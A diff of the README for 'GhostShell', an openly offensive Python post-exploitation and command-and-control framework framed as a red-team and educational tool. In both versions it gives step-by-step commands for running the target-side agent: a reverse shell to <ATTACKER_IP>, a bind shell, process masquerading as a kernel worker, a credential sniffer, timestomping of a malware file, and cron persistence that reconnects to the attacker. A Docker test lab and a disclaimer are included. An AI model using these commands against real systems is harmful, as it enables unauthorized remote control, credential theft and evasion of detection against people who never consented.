@@ -1,136 +1,151 @@
 # 👻 GhostShell
 
-## Executive Summary
+## Summary
 
-GhostShell is a lightweight Post-Exploitation and Operating System Manipulation framework designed for Red Teaming and Educational purposes.
+GhostShell is a lightweight post-exploitation and operating system manipulation framework designed strictly for Red Teaming and educational purposes.
 
-**Major Update (v3.0):** The framework has been split into two distinct components:
-1.  **Controller (`main.py`):** Runs on the Attacker's machine. Provides a rich CLI dashboard.
-2.  **Agent (`agent.py`):** A **Zero-Dependency** standalone payload. Runs on the Victim's machine using only the standard Python library.
+**Major update (v3.0):** the project is split into two components:
+1. **Controller (`main.py`)** – runs on the operator machine and provides the CLI interface.
+2. **Agent (`agent.py`)** – standalone payload with **zero dependencies** (standard library only).
 
 ## 🏗️ Architecture
 
 | Component | File | Role | Dependencies |
 |---|---|---|---|
-| **Controller** | `main.py` | Attacker Interface (C2) | `typer`, `rich`, `setproctitle` |
-| **Agent** | `agent.py` | Victim Payload | **NONE** (Standard Lib only) |
+| **Controller** | `main.py` | Operator interface (C2) | `typer`, `rich`, `setproctitle` |
+| **Agent** | `agent.py` | Target payload | **None** (Standard Lib) |
 
 ---
 
-## 🚀 Installation & Setup
+## ✅ Requirements
 
-### 1. Attacker Machine (Windows/Linux/macOS)
-This is where you control the operation.
+- Python 3.8+ (Controller and Agent)
+- Network connectivity between operator and target
+- Docker (optional, for the test lab)
+
+---
+
+## 🚀 Installation
+
+### 1) Operator machine (Windows/Linux/macOS)
 
 ```bash
-# Clone the repository
 git clone https://github.com/MariusZmr/GhostShell.git
 cd GhostShell
-
-# Install dependencies (Controller only)
 pip install -r requirements.txt
 ```
 
-### 2. Victim Machine (The Target)
-**No installation required.** You only need to transfer the `agent.py` file.
+### 2) Target machine
+
+No installation required. Transfer only `agent.py`.
 
 ```bash
-# Example transfer (if using Docker lab)
+# Example transfer to a container
 docker cp agent.py <container_id>:/tmp/agent.py
 ```
 
 ---
 
-## 🎮 Usage Scenarios
+## ⚙️ Core Features
 
-### Scenario 1: Reverse Shell (Standard)
-The victim connects back to the attacker. Bypasses inbound firewalls.
-
-1.  **Attacker:** Start the listener.
-    ```bash
-    python main.py listener --port 4444
-    ```
-2.  **Victim:** Execute the agent to connect back.
-    ```bash
-    python3 agent.py connect <ATTACKER_IP> --port 4444
-    ```
-
-### Scenario 2: Bind Shell (Fallback)
-Open a port on the victim and wait for the attacker.
-
-1.  **Victim:** Open the port.
-    ```bash
-    python3 agent.py listen --port 5555
-    ```
-2.  **Attacker:** Connect to the victim.
-    ```bash
-    python main.py handler <VICTIM_IP> 5555
-    ```
-
-### Scenario 3: Stealth & Evasion (Process Masquerading)
-Hide the python process from `ps` and `top` commands.
-
-*   **Victim:** Add the `--name` flag when connecting.
-    ```bash
-    python3 agent.py connect <IP> --name "kworker/u4:0"
-    ```
-    *Note: This uses purely native `ctypes` (libc prctl) calls on Linux. No external libraries needed.*
-
-### Scenario 4: Local Audit (Privilege Escalation)
-Perform a quick audit of the system without establishing a connection.
-
-*   **Victim:**
-    ```bash
-    python3 agent.py audit
-    ```
-    *   Checks Kernel version for Dirty Pipe/Cow.
-    *   Scans for dangerous SUID binaries (GTFOBins).
-
-### Scenario 5: Network Sniffer
-Capture credentials from cleartext traffic (requires Root).
-
-*   **Victim:**
-    ```bash
-    python3 agent.py sniff --interface eth0 --count 20
-    ```
-    *If `eth0` is not found, the agent will list available interfaces.*
-
-### Scenario 6: Anti-Forensics (Timestomping)
-Modify file timestamps to hide modification dates.
-
-*   **Victim:**
-    ```bash
-    # Clone timestamp from a system file (e.g., /bin/bash)
-    python3 agent.py timestomp /path/to/malware.py --ref /bin/bash
-    ```
-
-### Scenario 7: Persistence
-Ensure the agent restarts on reboot.
-
-*   **Victim:**
-    ```bash
-    python3 agent.py persist --method cron --payload "python3 /tmp/agent.py connect <ATTACKER_IP>"
-    ```
+- Reverse shell (target initiates connection)
+- Bind shell (target exposes a port, operator connects)
+- Process masquerading (custom name in listings)
+- Local audit (quick privilege escalation checks)
+- Network sniffer (requires root)
+- Timestomping (timestamp modification)
+- Persistence (restart on boot)
 
 ---
 
-## 🛠️ Development (Docker Lab)
+## 🎮 Usage (quick scenarios)
 
-To test safely without a second machine, use the included Docker setup.
+### 1) Reverse Shell (standard)
+
+**Operator:**
+```bash
+python main.py listener --port 4444
+```
+
+**Target:**
+```bash
+python3 agent.py connect <ATTACKER_IP> --port 4444
+```
+
+### 2) Bind Shell (fallback)
+
+**Target:**
+```bash
+python3 agent.py listen --port 5555
+```
+
+**Operator:**
+```bash
+python main.py handler <VICTIM_IP> 5555
+```
+
+### 3) Process masquerading
+
+**Target:**
+```bash
+python3 agent.py connect <ATTACKER_IP> --name "kworker/u4:0"
+```
+*Note: Uses `ctypes` + `prctl` on Linux. No external libraries required.*
+
+### 4) Local audit
+
+**Target:**
+```bash
+python3 agent.py audit
+```
+- Checks kernel versions for Dirty Pipe/Cow
+- Scans for risky SUID binaries (GTFOBins)
+
+### 5) Network sniffer
+
+**Target:**
+```bash
+python3 agent.py sniff --interface eth0 --count 20
+```
+*If `eth0` is not found, the agent lists available interfaces.*
+
+### 6) Timestomping
+
+**Target:**
+```bash
+python3 agent.py timestomp /path/to/file.py --ref /bin/bash
+```
+
+### 7) Persistence
+
+**Target:**
+```bash
+python3 agent.py persist --method cron --payload "python3 /tmp/agent.py connect <ATTACKER_IP>"
+```
+
+---
+
+## 🧪 Container usage (test lab)
+
+For safe testing without a second physical machine, use Docker.
 
 ```bash
-# 1. Start the Victim Container
+# 1) Start the target container
 docker-compose up -d --build
 
-# 2. Enter the Victim Container (to simulate the victim)
+# 2) Enter the container (target simulation)
 docker-compose exec ghostshell bash
 
-# 3. (Inside Docker) Run the agent
+# 3) (Inside container) Run the agent
 python3 agent.py connect host.docker.internal
 ```
+
+**Helpful notes:**
+- `host.docker.internal` works on Windows/macOS. On Linux, use the host IP.
+- If you need test traffic, run simple commands like `curl` or `wget` inside the container.
 
 ---
 
 ## ⚖️ Disclaimer
 
-This software was created **strictly for educational purposes**. The author is not responsible for any misuse of this utility. Always obtain permission before testing on networks you do not own.
+This software is provided **strictly for educational purposes**. The author is not responsible for any unauthorized use. Use only on systems you explicitly have permission to test.
